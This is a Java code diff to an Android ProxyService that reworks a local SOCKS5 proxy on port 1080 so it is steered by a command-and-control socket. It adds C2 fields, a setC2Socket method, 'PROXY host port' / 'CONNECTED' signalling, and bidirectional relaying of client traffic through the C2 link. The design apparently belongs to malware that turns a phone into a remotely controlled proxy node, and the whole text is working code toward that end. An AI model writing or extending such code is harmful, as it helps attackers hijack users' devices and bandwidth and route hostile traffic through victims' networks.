@@ -12,10 +12,13 @@ import java.util.concurrent.Executors;
 
 public class ProxyService extends Service {
     private static final String TAG = "ProxyService";
-    private static final int SOCKS5_PORT = 1080;
+    private static final int PROXY_PORT = 1080;
     private ServerSocket serverSocket;
     private ExecutorService executor;
     private volatile boolean running = false;
+    private Socket c2Socket;
+    private PrintWriter c2Writer;
+    private BufferedReader c2Reader;
 
     @Override
     public void onCreate() {
@@ -24,11 +27,21 @@ public class ProxyService extends Service {
         Log.d(TAG, "ProxyService created");
     }
 
+    public void setC2Socket(Socket socket) {
+        this.c2Socket = socket;
+        try {
+            c2Writer = new PrintWriter(socket.getOutputStream(), true);
+            c2Reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to set C2 socket: " + e.getMessage());
+        }
+    }
+
     public void startProxy() {
         if (running) return;
         running = true;
         executor.submit(this::proxyLoop);
-        Log.d(TAG, "SOCKS5 proxy started on port " + SOCKS5_PORT);
+        Log.d(TAG, "SOCKS5 proxy started on port " + PROXY_PORT);
     }
 
     public void stopProxy() {
@@ -47,11 +60,12 @@ public class ProxyService extends Service {
 
     private void proxyLoop() {
         try {
-            serverSocket = new ServerSocket(SOCKS5_PORT);
+            serverSocket = new ServerSocket(PROXY_PORT);
+            Log.d(TAG, "SOCKS5 proxy listening on port " + PROXY_PORT);
             while (running) {
                 try {
                     Socket client = serverSocket.accept();
-                    executor.submit(() -> handleSocks5(client));
+                    executor.submit(() -> handleProxy(client));
                 } catch (SocketException e) {
                     if (!running) break;
                 }
@@ -61,21 +75,24 @@ public class ProxyService extends Service {
         }
     }
 
-    private void handleSocks5(Socket client) {
+    private void handleProxy(Socket client) {
         try {
             InputStream in = client.getInputStream();
             OutputStream out = client.getOutputStream();
             byte[] buffer = new byte[1024];
 
+            // SOCKS5 handshake
             int len = in.read(buffer);
             if (len < 1 || buffer[0] != 0x05) {
                 client.close();
                 return;
             }
 
+            // No authentication
             out.write(new byte[]{0x05, 0x00});
             out.flush();
 
+            // SOCKS5 request
             len = in.read(buffer);
             if (len < 8) {
                 client.close();
@@ -88,76 +105,86 @@ public class ProxyService extends Service {
                 return;
             }
 
-            String destHost;
-            int destPort;
+            // Parse destination
+            String host;
+            int port;
             int addrType = buffer[3];
 
-            if (addrType == 0x01) {
-                destHost = String.format("%d.%d.%d.%d",
+            if (addrType == 0x01) { // IPv4
+                host = String.format("%d.%d.%d.%d",
                         buffer[4] & 0xFF, buffer[5] & 0xFF,
                         buffer[6] & 0xFF, buffer[7] & 0xFF);
-                destPort = ((buffer[8] & 0xFF) << 8) | (buffer[9] & 0xFF);
-            } else if (addrType == 0x03) {
+                port = ((buffer[8] & 0xFF) << 8) | (buffer[9] & 0xFF);
+            } else if (addrType == 0x03) { // Domain
                 int nameLen = buffer[4] & 0xFF;
-                destHost = new String(buffer, 5, nameLen);
-                destPort = ((buffer[5 + nameLen] & 0xFF) << 8) | (buffer[6 + nameLen] & 0xFF);
+                host = new String(buffer, 5, nameLen);
+                port = ((buffer[5 + nameLen] & 0xFF) << 8) | (buffer[6 + nameLen] & 0xFF);
             } else {
                 client.close();
                 return;
             }
 
-            Log.d(TAG, "SOCKS5: Connecting to " + destHost + ":" + destPort);
+            Log.d(TAG, "Proxy: " + host + ":" + port);
 
-            Socket dest = new Socket();
-            dest.connect(new InetSocketAddress(destHost, destPort), 10000);
+            // Send PROXY command through C2 socket
+            c2Writer.println("PROXY " + host + " " + port);
 
-            byte[] response = new byte[10];
-            response[0] = 0x05;
-            response[1] = 0x00;
-            response[2] = 0x00;
-            response[3] = 0x01;
-            out.write(response);
+            // Wait for CONNECTED response
+            String response = c2Reader.readLine();
+            if (response == null || !response.equals("CONNECTED")) {
+                client.close();
+                return;
+            }
+
+            // Send SOCKS5 success
+            byte[] success = new byte[10];
+            success[0] = 0x05;
+            success[1] = 0x00;
+            success[2] = 0x00;
+            success[3] = 0x01;
+            out.write(success);
             out.flush();
 
-            relayData(client, dest);
+            // Relay data
+            relayData(client);
 
         } catch (Exception e) {
-            Log.e(TAG, "SOCKS5 handler error: " + e.getMessage());
+            Log.e(TAG, "Proxy error: " + e.getMessage());
         }
     }
 
-    private void relayData(Socket client, Socket dest) {
+    private void relayData(Socket client) {
         try {
-            InputStream in1 = client.getInputStream();
-            OutputStream out1 = client.getOutputStream();
-            InputStream in2 = dest.getInputStream();
-            OutputStream out2 = dest.getOutputStream();
+            InputStream clientIn = client.getInputStream();
+            OutputStream clientOut = client.getOutputStream();
+            InputStream c2In = c2Socket.getInputStream();
+            OutputStream c2Out = c2Socket.getOutputStream();
 
             byte[] buffer = new byte[8192];
             boolean[] closed = {false};
 
+            // Client -> C2
             Thread t1 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = in1.read(buffer)) != -1) {
-                        out2.write(buffer, 0, len);
-                        out2.flush();
+                    while ((len = clientIn.read(buffer)) != -1) {
+                        c2Out.write(buffer, 0, len);
+                        c2Out.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
-                closeSockets(client, dest);
             });
 
+            // C2 -> Client
             Thread t2 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = in2.read(buffer)) != -1) {
-                        out1.write(buffer, 0, len);
-                        out1.flush();
+                    while ((len = c2In.read(buffer)) != -1) {
+                        clientOut.write(buffer, 0, len);
+                        clientOut.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
-                closeSockets(client, dest);
             });
 
             t1.start();
@@ -167,14 +194,11 @@ public class ProxyService extends Service {
                 Thread.sleep(100);
             }
 
+            try { client.close(); } catch (Exception e) {}
+
         } catch (Exception e) {
             Log.e(TAG, "Relay error: " + e.getMessage());
         }
-    }
-
-    private void closeSockets(Socket s1, Socket s2) {
-        try { s1.close(); } catch (Exception e) {}
-        try { s2.close(); } catch (Exception e) {}
     }
 
     @Override
@@ -189,7 +213,5 @@ public class ProxyService extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 }
